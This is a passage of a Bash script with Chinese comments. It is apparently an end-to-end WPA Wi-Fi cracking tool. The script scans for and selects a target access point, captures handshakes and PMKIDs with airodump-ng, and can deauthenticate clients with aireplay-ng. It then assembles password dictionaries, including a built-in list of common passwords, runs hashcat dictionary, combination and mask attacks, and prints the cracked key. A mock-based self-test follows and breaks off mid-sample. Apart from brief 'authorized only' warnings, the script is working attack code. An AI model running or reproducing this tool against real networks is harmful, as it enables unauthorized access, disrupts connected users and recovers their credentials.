    IFS=$'\t' read -r BSSID CHAN _ _ _ SSID < <(sed -n "${CHOICE}p" "$OUT_DIR/scan.csv")
  else
    # [V4-M4] 按 SSID 精确字段匹配（第 7 列），-- 防选项
    [ -f "$OUT_DIR/scan.csv" ] || die "--essid 需要先扫描"
    local line
    line=$(awk -F'\t' -v s="$ARG_ESSID" '$7==s' "$OUT_DIR/scan.csv" | head -1)
    [ -n "$line" ] || die "扫描结果中没有 SSID=$ARG_ESSID"
    local cnt; cnt=$(awk -F'\t' -v s="$ARG_ESSID" '$7==s' "$OUT_DIR/scan.csv" | wc -l)
    [ "$cnt" -gt 1 ] && logw "有 $cnt 个同名 SSID，取信号最强的第一个"
    IFS=$'\t' read -r BSSID CHAN _ _ _ SSID <<< "$line"
  fi
  BSSID=$(echo "$BSSID" | tr 'a-f' 'A-F')
  [ -n "$ARG_CHANNEL" ] && CHAN="$ARG_CHANNEL"
  # [M-8] 风险标注
  local enc
  enc=$(awk -F'\t' -v b="$BSSID" '$1==b{print $3; exit}' "$OUT_DIR/scan.csv" 2>/dev/null || echo "")
  case "$enc" in
    *ENTERPRISE*) logw "目标疑似 WPA-Enterprise/EAP（802.1X），字典攻击不适用！" ;;
    *SAE*|*OWE*)  logw "目标含 SAE/OWE 标记，纯 PSK 字典攻击可能无效" ;;
    *PMF*)        logw "目标启用 PMF(802.11w)，deauth 可能无效，建议纯被动抓包" ;;
  esac
  # [V4-M9] 5GHz 信道提示
  if [ -n "$CHAN" ] && [ "$CHAN" -ge 36 ] 2>/dev/null; then
    logw "信道 $CHAN 属于 5GHz 频段，确认网卡支持"
  fi
  log "已选: [$BSSID] ch=$CHAN SSID=$SSID (加密标记: $enc)"
  report "选目标" "OK" "BSSID=$BSSID ch=$CHAN SSID=$SSID"
}

# ----------------------------------------------------------------------------
# 5. 抓包 [F-4][F-5][F-6][v2缺陷-7~15]
# ----------------------------------------------------------------------------
do_capture() {
  local dur="$CAPTURE_DUR"
  local merged_cap="$OUT_DIR/${BSSID}.cap"
  local essidfile="$OUT_DIR/${BSSID}.essid"
  local hc22000="$OUT_DIR/${BSSID}.hc22000"
  local workdir
  workdir=$(mktemp -d "$OUT_DIR/cap.XXXXXX") || die "无法创建抓包目录"

  # 快照已在 main() 开头执行 [V4-F6]
  prepare_radio 1
  log "抓包 ${dur}s（ch ${CHAN:-1}，BSSID $BSSID）"
  [ "$DEAUTH_COUNT" -gt 0 ] && logw "--deauth 已启用：${DEAUTH_COUNT} 次（仅限授权网络！）"
  log "  Ctrl-C 可提前结束"

  # 启动 airodump
  ( cd "$workdir" && airodump-ng -c "${CHAN:-1}" --bssid "$BSSID" -w "cap" "$IFACE" >/dev/null 2>&1 ) &
  CAP_PID=$!

  # [V4-H3] deauth：精确发送 N 次（分 3 轮，每轮 N/3 次，余数补到最后一轮）
  DEAUTH_PID=""
  if [ "$DEAUTH_COUNT" -gt 0 ] && command -v aireplay-ng >/dev/null 2>&1; then
    (
      DE_SENT=0; DE_TOTAL=$DEAUTH_COUNT
      DE_PER=$(( DEAUTH_COUNT / 3 )); [ "$DE_PER" -lt 1 ] && DE_PER=1
      DE_ROUND=0
      while [ "$DE_SENT" -lt "$DE_TOTAL" ] && [ "$DE_ROUND" -lt 3 ]; do
        sleep 15
        DE_THIS=$DE_PER
        # 最后一轮发送剩余
        DE_REMAIN=$(( DE_TOTAL - DE_SENT ))
        [ "$DE_THIS" -gt "$DE_REMAIN" ] && DE_THIS=$DE_REMAIN
        [ "$DE_ROUND" -eq 2 ] && DE_THIS=$DE_REMAIN
        # [V4-H4] DEAUTH_TARGET 已校验 MAC 格式，加引号
        if [ $((DE_ROUND % 2)) -eq 1 ] && [ -n "$DEAUTH_TARGET" ]; then
          aireplay-ng --deauth "$DE_THIS" -c "$DEAUTH_TARGET" -a "$BSSID" "$IFACE" >/dev/null 2>&1
        else
          aireplay-ng --deauth "$DE_THIS" -a "$BSSID" "$IFACE" >/dev/null 2>&1
        fi
        DE_SENT=$((DE_SENT + DE_THIS))
        DE_ROUND=$((DE_ROUND + 1))
      done
    ) &
    DEAUTH_PID=$!
    sleep 2
    kill -0 "$DEAUTH_PID" 2>/dev/null || { logw "deauth 子进程启动失败（检查 aireplay-ng/injection 支持）"; DEAUTH_PID=""; }
  fi

  # 等待
  local elapsed=0
  while [ "$elapsed" -lt "$dur" ] && kill -0 "$CAP_PID" 2>/dev/null; do
    sleep 1
    elapsed=$((elapsed+1))
    # [V4-H5][V4-H6] 提前结束：检查所有分片，同时检测 PMKID 和 4-way
    if [ "$elapsed" -ge 60 ] && [ $((elapsed % 30)) -eq 0 ]; then
      local probe_ok=0
      for shard in "$workdir"/cap-*.cap; do
        [ -e "$shard" ] || continue
        if hcxpcapngtool -o "$workdir/probe.hc22000" "$shard" >/dev/null 2>&1 \
           && [ -s "$workdir/probe.hc22000" ]; then
          if grep -q 'WPA\*01\*pmkid' "$workdir/probe.hc22000"; then
            log "已捕获 PMKID（$shard），提前结束抓包"
            probe_ok=1; break
          fi
          if grep -q 'WPA\*02\*mic' "$workdir/probe.hc22000"; then
            log "已捕获 4-way 握手（$shard），提前结束抓包"
            probe_ok=1; break
          fi
        fi
      done
      [ "$probe_ok" -eq 1 ] && break
    fi
  done

  kill "$CAP_PID" 2>/dev/null || true
  wait "$CAP_PID" 2>/dev/null || true
  [ -n "$DEAUTH_PID" ] && { kill "$DEAUTH_PID" 2>/dev/null || true; wait "$DEAUTH_PID" 2>/dev/null || true; }
  DEAUTH_PID=""
  kill_by_bssid "$BSSID"

  # [F-5] 分片检查：显式检测通配未展开（不用 nullglob，避免污染全局）
  local shards=( "$workdir"/cap-*.cap )
  if [ ${#shards[@]} -eq 1 ] && [ ! -e "${shards[0]}" ]; then
    prepare_radio 0; rm -rf "$workdir"
    die "未生成任何 .cap 分片（信道 ${CHAN:-1} 可能错误，或 AP 不在线）"
  fi

  # 合并 [v2缺陷-14]：优先 mergecap；无 mergecap 时逐片检查而非盲目 cat
  if command -v mergecap >/dev/null 2>&1; then
    if ! mergecap -w "$merged_cap" "${shards[@]}" 2>"$workdir/merge.err"; then
      logw "mergecap 失败: $(head -1 "$workdir/merge.err")，尝试 cat 兜底"
      cat "${shards[@]}" > "$merged_cap"
    fi
  else
    logw "无 mergecap，用 cat 兜底合并（多分片时结构可能受损，建议只保留首分片）"
    cat "${shards[@]}" > "$merged_cap"
  fi

  # [v2缺陷-15] 结果验证
  local cap_bytes; cap_bytes=$(wc -c < "$merged_cap")
  rm -rf "$workdir"
  log "分片数: ${#shards[@]} → $merged_cap (${cap_bytes} bytes)"
  [ "$cap_bytes" -gt 216 ] || { prepare_radio 0; die "合并后 cap 异常小（${cap_bytes}B），可能抓包失败"; }

  # 恢复网卡
  prepare_radio 0

  # 转 hc22000（唯一转换链，[F-3] 不再有 hccapx 分支）
  log "hcxpcapngtool 提取握手/PMKID..."
  if ! hcxpcapngtool -o "$hc22000" "$merged_cap" >"$OUT_DIR/hcx.$BSSID.log" 2>&1; then
    logw "hcxpcapngtool 报错（见 $OUT_DIR/hcx.$BSSID.log）"
  fi
  local has_handshake=0 has_pmkid=0
  if [ -s "$hc22000" ]; then
    grep -q 'WPA\*02\*mic' "$hc22000" && has_handshake=1
    grep -q 'WPA\*01\*pmkid' "$hc22000" && has_pmkid=1
  fi

  # 从 hc22000 提取 ESSID（[H-8] '*' 分隔 + python3 hex 解码）
  if [ -s "$hc22000" ]; then
    local essid_hex
    essid_hex=$(head -1 "$hc22000" | awk -F'*' '{print $6}' | sed 's/^ssid://')
    if [ -n "$essid_hex" ] && [ "$essid_hex" != "00" ] && [[ "$essid_hex" =~ ^[0-9a-fA-F]+$ ]]; then
      local essid_hex_trim
      essid_hex_trim=$(echo "$essid_hex" | tr -d ' \t')
      [ $(( ${#essid_hex_trim} % 2 )) -ne 0 ] && essid_hex_trim="${essid_hex_trim}0"  # 补偶数
      local dec=""
      if command -v python3 >/dev/null 2>&1; then
        dec=$(python3 -c 'import sys
h=sys.argv[1]
while len(h) >= 2 and h.endswith("00"):
    h = h[:-2]
if len(h) % 2: h = h + "0"
try: b=bytes.fromhex(h)
except Exception: sys.exit(0)
s=b.decode("utf-8",errors="replace").replace("\x00","")
sys.stdout.write(s)' "$essid_hex_trim" 2>/dev/null || true)
      else
        dec=$(printf '%b' "$(echo "$essid_hex_trim" | sed 's/../\\x&/g')" 2>/dev/null || true)
      fi
      [ -n "$dec" ] && printf '%s' "$dec" > "$essidfile"
    fi
  fi
  # 兜底：aircrack-ng 输出（格式因版本而异，best-effort）
  if [ ! -s "$essidfile" ]; then
    aircrack-ng "$merged_cap" 2>/dev/null | grep -m1 -E 'ESSID' | awk '{sub(/^.*ESSID[ ]*:[ ]*/,""); print}' > "$essidfile" || true
  fi

  # [F-6] 握手计数：解析 aircrack-ng 的 "(N handshake)" + hc22000 行数
  local hsk_lines pmkid_lines hsk_total
  hsk_lines=$(grep -c 'WPA\*02\*mic' "$hc22000" 2>/dev/null || true)
  pmkid_lines=$(grep -c 'WPA\*01\*pmkid' "$hc22000" 2>/dev/null || true)
  local hsk_ac=0
  hsk_ac=$(aircrack-ng "$merged_cap" 2>/dev/null | grep -oE '\([0-9]+ handshakes?\)' | grep -oE '[0-9]+' | head -1 || true)
  hsk_total=$(( ${hsk_lines:-0} + ${hsk_ac:-0} ))

  local final_ssid; final_ssid=$(cat "$essidfile" 2>/dev/null || echo "?")
  [ "$final_ssid" = "?" ] && [ -n "$SSID" ] && final_ssid="$SSID"

  echo
  echo "=== 抓包结果 ==="
  echo "  cap     : $merged_cap"
  echo "  ESSID   : $final_ssid"
  echo "  hc22000 : $hc22000 $([ -s "$hc22000" ] && echo '(已生成)' || echo '(未生成)')"
  echo "  4-way握手: ${hsk_lines:-0} 条记录（aircrack 报 ${hsk_ac:-0}）"
  echo "  PMKID   : ${pmkid_lines:-0} 条"
  [ -s "$OUT_DIR/hcx.$BSSID.log" ] && log "  hcxpcapngtool 日志尾部:" && tail -3 "$OUT_DIR/hcx.$BSSID.log" | sed 's/^/    /'

  if [ "$has_handshake" -eq 0 ] && [ "$has_pmkid" -eq 0 ]; then
    logw "未抓到握手/PMKID。建议：重试 / 换信道 / 客户端在线时抓包 / 授权网络下 --deauth N"
    report "抓包" "FAIL" "无握手/PMKID（ch=${CHAN:-1}, ${dur}s）"
    return 1
  fi
  report "抓包" "OK" "握手=${hsk_lines:-0} PMKID=${pmkid_lines:-0}"
  SSID="$final_ssid"
  return 0
}

# ----------------------------------------------------------------------------
# 6. 字典构建 [H-5][E-7]：日志全 stderr，stdout 无输出
# ----------------------------------------------------------------------------
clean_wordlist() { # clean_wordlist <raw> <clean>
  local raw="$1" clean="$2"
  # CRLF → 去空行 → 去非打印(保留可打印 ASCII + UTF-8 多字节) → 长度 8~63 → sort -u
  # 说明：WPA PSK 密码 8~63 位 ASCII；>63 的字典行对 -m 22000 无效
  tr -d '\r' < "$raw" \
    | grep -aE '[[:print:]]+$' \
    | grep -avE '[[:cntrl:]]' \
    | awk 'length($0) >= 8 && length($0) <= 63' \
    | LC_ALL=C sort -u > "$clean"
}

build_wordlist() {
  local combined="$OUT_DIR/combined.dict"
  local parts=()
  local p

  # 1. 用户指定（--wordlist-only 时仅此一项）
  if [ -n "$USER_WORDLIST" ]; then
    [ -f "$USER_WORDLIST" ] || die "字典不存在: $USER_WORDLIST"
    parts+=("$USER_WORDLIST")
  fi

  if [ "$WORDLIST_ONLY" -eq 0 ]; then
    # 2. /opt/wordlists 与 top-wifi 目录（按文件名序，概率排序由文件名前缀控制）
    local wl_dirs=()
    [ -d /opt/wordlists/top-wifi ] && wl_dirs+=("/opt/wordlists/top-wifi")
    [ -d /opt/wordlists ] && wl_dirs+=("/opt/wordlists")
    local d
    for d in "${wl_dirs[@]:-}"; do
      [ -n "$d" ] && [ -d "$d" ] || continue
      for p in "$d"/*.txt; do
        [ -f "$p" ] || continue
        # 跳过已合并的最终文件自身
        [ "$(basename "$p")" = "final.txt" ] && continue
        parts+=("$p")
      done
    done

    # 3. rockyou（.gz 解压到 $OUT_DIR，不写系统目录 [v2缺陷-27]）
    local rockyou=""
    if [ -f /usr/share/wordlists/rockyou.txt ]; then
      rockyou="/usr/share/wordlists/rockyou.txt"
    elif [ -f /usr/share/wordlists/rockyou.txt.gz ]; then
      log "rockyou.txt.gz 存在，解压到工作目录..."
      if zcat /usr/share/wordlists/rockyou.txt.gz > "$OUT_DIR/rockyou.txt" 2>/dev/null; then
        rockyou="$OUT_DIR/rockyou.txt"
      fi
    fi
    [ -n "$rockyou" ] && parts+=("$rockyou")

    # 4. SecLists（常见路径，存在才用 [v2缺陷-28]）
    local seclists=(
      "/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100000.txt"
      "/usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt"
      "/usr/share/seclists/Passwords/Common-Credentials/top10000.txt"
    )
    for p in "${seclists[@]}"; do
      [ -f "$p" ] && parts+=("$p")
    done
    # 5. 内置 mini（--no-builtin 可关）
    if [ "$NO_BUILTIN" -eq 0 ]; then
      local mini="$OUT_DIR/mini-pw.lst"
      cat > "$mini" <<'LST'
12345678
123456789
1234567890
qwerty123
admin123
wifi1234
router123
88888888
66666666
99999999
a123456789
aa12345678
qwe123456
woaini520
5201314520
asdf1234
zxcv1234
abcd1234
11223344
12341234
11112222
00001111
password123
1qaz2wsx
qazwsx123
admin888
12345678a
woaini1314
iloveyou123
admin6666
root6666
123456789q
abc123456
zhangwei1990
wangfang1988
liuyang0520
chenchen2010
xiaoming666
laoban888
1122334455
13141314
52013145201314
LST
      parts+=("$mini")
    fi
  fi

  [ ${#parts[@]} -gt 0 ] || die "无任何字典来源（传字典路径，或装 rockyou）"

  log "合并字典（${#parts[@]} 个来源）..."
  for p in "${parts[@]}"; do
    log "    + $p ($(wc -l < "$p" 2>/dev/null || echo '?') 行)"
  done

  # [E-7] cat 合并后用 sort -u 外部排序去重（避免 awk 哈希 OOM）
  cat "${parts[@]}" 2>/dev/null > "$OUT_DIR/combined.raw"
  local raw_lines; raw_lines=$(wc -l < "$OUT_DIR/combined.raw")
  log "  原始合并: $raw_lines 行，清洗去重中..."
  clean_wordlist "$OUT_DIR/combined.raw" "$combined"

  # [V4-H7] 概率排序：先清洗（已做），再按频次排序（保留空格密码）
  if [ "$SORT_BY_RANK" -eq 1 ]; then
    log "  按频次概率排序（基于清洗后字典）..."
    # 用 tab 分隔计数和词，避免 awk 字段重组破坏空格
    sort "$OUT_DIR/combined.raw" | uniq -c | sort -k1,1nr -k2,2 | \
      sed 's/^ *//' | while IFS= read -r line; do
        # 行格式: "  3 password123" → 去掉前导数字和空格
        printf '%s\n' "${line#*[0-9][0-9]* }"
      done | LC_ALL=C sort -u > "$OUT_DIR/combined.ranked" || true
    [ -s "$OUT_DIR/combined.ranked" ] && mv "$OUT_DIR/combined.ranked" "$combined"
  fi

  # --top N 分阶段
  if [ "$TOP_N" -gt 0 ]; then
    log "  --top $TOP_N: 截断字典"
    head -n "$TOP_N" "$combined" > "$OUT_DIR/combined.top" && mv "$OUT_DIR/combined.top" "$combined"
  fi

  rm -f "$OUT_DIR/combined.raw"
  local total; total=$(wc -l < "$combined")
  log "合并后: $combined ($total 行)"
  [ "$total" -gt 0 ] || die "清洗后字典为空（原始行可能全部 <8 位）"
  # stdout 无输出；路径由调用方通过 $OUT_DIR/combined.dict 获取 [F-1]
  return 0
}

# ----------------------------------------------------------------------------
# 7. 离线破解 [F-2][F-3][H-6][H-7][M-4][M-5][M-6]
# ----------------------------------------------------------------------------
do_crack() {
  local merged_cap="$OUT_DIR/${BSSID}.cap"
  local hc22000="$OUT_DIR/${BSSID}.hc22000"
  # [V4-H10] 分阶段命中文件
  local hit_dict="$OUT_DIR/${BSSID}.hit.dict"
  local hit_comb="$OUT_DIR/${BSSID}.hit.combine"
  local hit_mask="$OUT_DIR/${BSSID}.hit.mask"
  HITFILE="$OUT_DIR/${BSSID}.hit"
  HC_LOG="$OUT_DIR/hashcat.$BSSID.log"
  local wordlist="$OUT_DIR/combined.dict"

  [ -f "$merged_cap" ] || die "未找到 $merged_cap"
  [ -s "$hc22000" ] || { hcxpcapngtool -o "$hc22000" "$merged_cap" >/dev/null 2>&1 || true; }
  [ -s "$hc22000" ] || die "hc22000 不存在或为空，cap 内无有效握手/PMKID"

  [ -f "$wordlist" ] || build_wordlist
  [ -f "$wordlist" ] || die "字典构建失败"

  # [V4-H11] session 名清洗（去冒号/空格/斜杠）
  [ -n "$SESSION_NAME" ] || SESSION_NAME="wifi_crack_$(echo "${BSSID:0:8}" | tr -d ': ' )"
  HC_SESSION="${SESSION_NAME//\//_}"

  local has_pmkid=0 has_handshake=0
  grep -q 'WPA\*01\*pmkid' "$hc22000" && has_pmkid=1
  grep -q 'WPA\*02\*mic'   "$hc22000" && has_handshake=1
  # [V4-E10] HC_BIN 白名单：只允许 hashcat 或绝对路径 /usr/bin/hashcat
  local hc_bin="hashcat"
  if [ -n "${HC_BIN:-}" ]; then
    case "$HC_BIN" in
      hashcat|/usr/bin/hashcat|/usr/local/bin/hashcat) hc_bin="$HC_BIN" ;;
      *) logw "HC_BIN=$HC_BIN 不在白名单，使用默认 hashcat" ;;
    esac
  fi

  echo
  echo "${CYA}>>> WPA 离线破解${NC}"
  echo "  BSSID : $BSSID"
  echo "  SSID  : ${SSID:-?}"
  echo "  cap   : $merged_cap"
  echo "  hc22000: $hc22000 (PMKID=$has_pmkid, 4way=$has_handshake)"
  echo "  字典  : $wordlist ($(wc -l < "$wordlist") 行)"
  [ -n "$RULE_FILE" ] && [ -f "$RULE_FILE" ] && echo "  规则  : $RULE_FILE"
  [ -n "$MASK" ]      && echo "  掩码  : $MASK"
  [ -n "$COMBINE_LEFT" ] && echo "  组合: $COMBINE_LEFT x $COMBINE_RIGHT"
  echo "  日志  : $HC_LOG"

  # hashcat 公共参数
  local dev_opt=""
  # [V4-H11] CPU 回退加 --force
  if [ "$FORCE_CPU" -eq 1 ]; then
    dev_opt="-D 1 --force"
  fi
  # [V4-M10] --restore 检查文件存在
  local restore_opt=""
  if [ "$RESTORE" -eq 1 ]; then
    if [ -f "$HOME/.hashcat/restore-$HC_SESSION.bin" ] 2>/dev/null; then
      restore_opt="--restore"
      log "检测到 restore 文件，断点续跑"
    else
      logw "--restore 指定但无 restore 文件（session=$HC_SESSION），从头开始"
    fi
  fi

  local t0 t1; t0=$(date +%s)
  local found=0

  # 攻击 1: 字典 (-a 0)，可选规则
  if [ -z "$MASK" ] && [ -z "$COMBINE_LEFT" ]; then
    log "hashcat -m 22000 -a 0 字典攻击..."
    if [ -n "$RULE_FILE" ] && [ -f "$RULE_FILE" ]; then
      $hc_bin -m 22000 -a 0 $dev_opt \
        --session="$HC_SESSION" $restore_opt \
        --potfile-disable --status --status-timer 30 \
        -w "$WORKLOAD" -o "$hit_dict" \
        -r "$RULE_FILE" \
        "$hc22000" "$wordlist" > "$HC_LOG" 2>&1
    else
      $hc_bin -m 22000 -a 0 $dev_opt \
        --session="$HC_SESSION" $restore_opt \
        --potfile-disable --status --status-timer 30 \
        -w "$WORKLOAD" -o "$hit_dict" \
        "$hc22000" "$wordlist" > "$HC_LOG" 2>&1
    fi
    local rc=$?
    if [ $rc -ne 0 ] && ! grep -q 'Status.*Exhausted\|Status.*Cracked\|Session.*done' "$HC_LOG"; then
      logw "hashcat 退出码 $rc（见日志尾部）:"
      tail -5 "$HC_LOG" | sed 's/^/    /' >&2
    fi
    # [V4-H9] 命中后停止后续攻击
    if [ -s "$hit_dict" ]; then
      found=1
      cp "$hit_dict" "$HITFILE" 2>/dev/null || true
      log "字典阶段命中！"
    fi
  fi

  # 攻击 2: 组合 (-a 1)——仅当字典未命中时
  if [ "$found" -eq 0 ] && [ -n "$COMBINE_LEFT" ] && [ -n "$COMBINE_RIGHT" ]; then
    [ -f "$COMBINE_LEFT" ] || die "组合左字典不存在: $COMBINE_LEFT"
    [ -f "$COMBINE_RIGHT" ] || die "组合右字典不存在: $COMBINE_RIGHT"
    log "hashcat -m 22000 -a 1 组合攻击: $COMBINE_LEFT x $COMBINE_RIGHT"
    $hc_bin -m 22000 -a 1 $dev_opt \
      --session="${HC_SESSION}_comb" \
      --potfile-disable --status --status-timer 30 \
      -w "$WORKLOAD" -o "$hit_comb" \
      "$hc22000" "$COMBINE_LEFT" "$COMBINE_RIGHT" >> "$HC_LOG" 2>&1 || \
      logw "组合攻击退出码 $?（见 $HC_LOG）"
    if [ -s "$hit_comb" ]; then
      found=1
      cp "$hit_comb" "$HITFILE" 2>/dev/null || true
      log "组合阶段命中！"
    fi
  fi

  # 攻击 3: 掩码 (-a 3)——仅当前面未命中时
  if [ "$found" -eq 0 ] && [ -n "$MASK" ]; then
    [[ "$MASK" =~ ^[?a-zA-Z0-9] ]] || die "掩码格式可疑: $MASK"
    log "hashcat -m 22000 -a 3 掩码攻击: $MASK"
    $hc_bin -m 22000 -a 3 $dev_opt \
      --session="${HC_SESSION}_mask" \
      --potfile-disable --status --status-timer 30 \
      -w "$WORKLOAD" -o "$hit_mask" \
      "$hc22000" "$MASK" >> "$HC_LOG" 2>&1 || \
      logw "掩码攻击退出码 $?（见 $HC_LOG）"
    if [ -s "$hit_mask" ]; then
      found=1
      cp "$hit_mask" "$HITFILE" 2>/dev/null || true
      log "掩码阶段命中！"
    fi
  fi

  t1=$(date +%s)
  local elapsed=$((t1 - t0))

  # [V4-H8] 命中提取：hashcat -m 22000 输出 "<hash>:<candidate>"
  # hash 中含 MAC 地址（多个冒号），用 rsplit 取最后一个冒号后的内容
  local pw=""
  if [ -s "$HITFILE" ]; then
    local firstline
    firstline=$(head -1 "$HITFILE")
    if command -v python3 >/dev/null 2>&1; then
      pw=$(echo "$firstline" | python3 -c 'import sys; line=sys.stdin.read().strip(); parts=line.rsplit(":",1); print(parts[1] if len(parts)==2 else line)')
    else
      # 无 python3 兜底：用 awk 取最后一个冒号后
      pw=$(echo "$firstline" | awk -F: '{print $NF}')
      [ -z "$pw" ] && pw="$firstline"
    fi
  fi

  echo
  echo "=== 破解结果 ==="
  echo "  耗时  : ${elapsed}s"
  if [ -n "$pw" ]; then
    echo "  ${GRN}[OK] 破解成功！${NC}"
    echo "  密码  : ${GRN}$pw${NC}"
    echo "  提示  : 授权审计场景请记录证据；自有网络请尽快改密码"
    report "破解" "CRACKED" "耗时 ${elapsed}s"
  else
    echo "  ${YLW}[未命中]${NC} 本次字典/规则/掩码/组合未覆盖该密码"
    echo "  建议  : 1) 换更大字典  2) --sort-by-rank 概率排序  3) --rule 规则"
    echo "          4) --combine 组合  5) --mask 掩码  6) --restore 续跑"
    report "破解" "MISS" "耗时 ${elapsed}s"
  fi
  echo "  命中文件: $HITFILE"
  echo "  hashcat日志: $HC_LOG"
}

# ----------------------------------------------------------------------------
# main
# ----------------------------------------------------------------------------
main() {
  precheck

  # [V4-F6] 立即快照网卡和服务状态（在任何 monitor 切换之前）
  snapshot_iface

  # [V4-F9] --bssid 无 --channel 时先扫描取信道
  if [ -n "$ARG_BSSID" ] && [ -z "${ARG_CHANNEL:-}" ]; then
    log "--bssid 无 --channel，先扫描取信道..."
    do_scan || true
    if [ -f "$OUT_DIR/scan.csv" ]; then
      local _b
      _b=$(echo "$ARG_BSSID" | tr 'a-f' 'A-F')
      CHAN=$(awk -F'\t' -v b="$_b" '$1==b{print $2; exit}' "$OUT_DIR/scan.csv")
    fi
    [ -n "$CHAN" ] || die "--bssid 未指定 --channel 且扫描中未找到，请用 --channel N 指定"
    log "从扫描结果获取信道: $CHAN"
  fi

  # 非交互 --bssid 时：
  # [V4-F9] 无 --channel 时先快速扫描取信道
  if [ -n "$ARG_BSSID" ]; then
    BSSID=$(echo "$ARG_BSSID" | tr 'a-f' 'A-F')
    CHAN="${ARG_CHANNEL:-}"
    SSID="(指定BSSID)"
    if [ -z "$CHAN" ]; then
      log "--bssid 无 --channel，先扫描取信道..."
      do_scan || true
      if [ -f "$OUT_DIR/scan.csv" ]; then
        CHAN=$(awk -F'\t' -v b="$BSSID" '$1==b{print $2; exit}' "$OUT_DIR/scan.csv")
      fi
      [ -n "$CHAN" ] || die "--bssid 未指定 --channel 且扫描中未找到 BSSID=$BSSID，请用 --channel N 指定"
      log "从扫描结果获取信道: $CHAN"
    fi
    report "选目标" "OK" "BSSID=$BSSID ch=$CHAN"
  else
    do_scan
    pick_target
  fi

  do_capture || die "抓包失败或无握手/PMKID，退出"
  if [ "$NO_AUTO_CRACK" -eq 1 ]; then
    log "NO_AUTO_CRACK=1，跳过破解"
  else
    do_crack
  fi
  # [V4-M6] JSON 输出
  if [ "$JSON_OUT" -eq 1 ]; then
    local result="miss"
    [ -s "$HITFILE" ] && result="cracked"
    printf '{"bssid":"%s","ssid":"%s","result":"%s","elapsed":%s,"out_dir":"%s"}\n' \
      "$BSSID" "${SSID:-?}" "$result" "$(($(date +%s) - ${t0:-$(date +%s)}))" "$OUT_DIR"
  fi
}
# ============================================================================
# 自测模式（--selftest）：不碰真实网卡，用 mock 工具链验证修复点
#   v4 覆盖:
#     V4-F1 CSV 解析（AP/Station 行区分、列位正确）
#     V4-F4 --combine 参数解析
#     V4-F5 多实例锁（全局路径）
#     V4-F7 STOP_NM 复位
#     V4-F8 --bssid 格式校验
#     V4-H3 deauth 次数精确
#     V4-H7 sort-by-rank 保留空格
#     V4-H8 命中提取（MAC 冒号）
#     V4-H9 命中后停止
#     F-2 PMKID 判断 / F-5 分片 / F-6 握手计数 / H-5 清洗 / H-8 ESSID hex
# ============================================================================
selftest() {
  local T; T=$(mktemp -d /tmp/wifi-selftest.XXXXXX) || { echo "无法建临时目录" >&2; exit 1; }
  pass=0; fail=0
  ck() { # ck <名称> <0/1 成功?>
    if [ "$2" -eq 0 ]; then echo "  [PASS] $1"; pass=$((pass+1)); else echo "  [FAIL] $1"; fail=$((fail+1)); fi
  }
  echo "== selftest: $T" >&2

  # 构造 mock 环境
  mkdir -p "$T/bin"
  cat > "$T/bin/hashcat" <<'M'
#!/usr/bin/env bash
# mock hashcat: 记录参数，命中规则: 字典含 mypass123 → 输出带冒号
args=("$@")
echo "hashcat $*" >> "${MOCK_LOG:-/dev/null}"
out=""
for a in "$@"; do out="$out $a"; done
# 找 -o 参数
while [ $# -gt 0 ]; do
  case "$1" in
    -o) HIT="$2" ;;
  esac
  shift || true
done
if echo "$out" | grep -q 'mypass123\|my wifi pass'; then
  echo "WPA-1:5678 my wifi pass" > "$HIT" 2/dev/null
fi
echo "Status: Exhausted"
exit 0
M
  chmod +x "$T/bin/hashcat"
  cat > "$T/bin/hcxpcapngtool" <<M
#!/usr/bin/env bash
# mock: 从 <cap 文件参数> 生成 hc22000
for a in "\$@"; do case "\$a" in *.cap) SRC="\$a";; esac; done
o=""
while [ \$# -gt 0 ]; do case "\$1" in -o) O="\$2";; esac; shift; done
[ -n "\$O" ] && { cp "\$T/hc22000.sample" "\$O" 2>/dev/null || true; }
echo "mock hcxpcapngtool done"
M
  chmod +x "$T/bin/hcxpcapngtool"
  cat > "$T/bin/aircrack-ng" <<'M'
#!/usr/bin/env bash
echo "  #  BSSID              [essid] (WPA2 (2 handshakes))"
exit 0
M
  chmod +x "$T/bin/aircrack-ng"

  # hc22000 样本: 1 PMKID + 1 4way, ESSID = "MyWiFi" (4d79574669, 10位=5字节, 奇数hex需补0)
  printf '%s\n' \
    "WPA*01*pmkid*00:11:22:33:44:55*aa:bb:cc:dd:ee:ff*ssid:4d7957694669***" \
    "WPA*02*mic*aa:bb:cc:dd:ee:ff*00:11:22:33:44:55*ssid:4d7957694669*00:11:22:33:44:55:aa:bb:cc:dd:ee:ff*01:02:03:04:05:06:07:08:09:0a:0b:0c:0d:0e:0f:01:02:03:04:05:06:07:08:09:0a:0b:0c:0d:0e:0f:10:11:12:13:14:15:16:17:18:19:1a:1b:1c:1d:1e:1f:20:21:22:23:24:25:26:27:28:29:2a:2b:2c:2d:2e:2f:30:31:32:33:34:35:36:37:38:39:3a:3b:3c:3d:3e:3f:40:41:42:43:44:45:46:47:48:49:4a:4b:4c:4d:4e:4f:50:51:52:53:54:55:56:57:58:59:5a:5b:5c:5d:5e:5f:60:61:62:63:64:65:66:67:68:69:6a:6b:6c:6d:6e:6f:70:71:72:73:74:75:76:77:78:79:7a:7b:7c:7d:7e:7f:80:81:82:83:84:85:86:87:88:89:8a:8b:8c:8d:8e:8f:90:91:92:93:94:95:96:97:98:99:9a:9b:9c:9d:9e:9f:aa:ab:ac:ad:ae:af:b0:b1:b2:b3:b4:b5:b6:b7:b8:b9:ba:bb:bc:bd:be:bf:c0:c1:c2:c3:c4:c5:c6:c7:c8:c9:ca:cb:cc:cd:ce:cf:d0:d1:d2:d3:d4:d5:d6:d7:d8:d9:da:db:dc:dd:de:df:e0:e1:e2:e3:e4:e5:e6:e7:e8:e9:ea:eb:ec:ed:ee:ef:f0:f1:f2:f3:f4:f5:f6:f7:f8:f9:fa:fb:fc:fd:fe:ff:01:02:03:04:05:06:07:08:09:0a:0b:0c:0d:0e:0f:10:11:12:13:14:15:16:17:18:19:1a:1b:1c:1d:1e:1f:20:21:22:23:24:25:26:27:28:29:2a:2b:2c:2d:2e:2f:30:31:32:33:34:35:36:37:38:39:3a:3b:3c:3d:3e:3f:40:41:42:43:44:45:46:47:48:49:4a:4b:4c:4d:4e:4f:50:51:52:53:54:55:56:57:58:59:5a:5b:5c:5d:5e:5f:60:61:62:63:64:65:66:67:68:69:6a:6b:6c:6d:6e:6f:70:71:72:73:74:75:76:77:78:79:7a:7b:7c:7d:7e:7f:80:81:82:83:84:85:86:87:88:89:8a:8b:8c:8d:8e:8f:90:91:92:93:94:95:96:97:98:99:9a:9b:9c:9d:9e:9